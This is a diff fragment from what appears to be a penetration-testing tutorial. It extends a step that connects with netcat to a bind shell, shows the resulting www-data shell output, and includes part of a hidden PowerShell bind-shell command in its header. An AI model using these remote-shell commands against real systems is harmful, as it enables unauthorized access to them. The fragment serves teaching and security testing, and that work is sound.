@@ -104,7 +104,16 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.So
 
 #### Step 2: Netcat Connection
 
-Once we execute the bind shell command, we should have a shell waiting for us on the specified 
+Once we execute the bind shell command, we should have a shell waiting for us on the specified port, which we'll now connect to using `netcat`:
+
+```bash
+$ nc [ip] 1234
+
+id # Input
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+
 
 ---
 ## TTY Upgrade
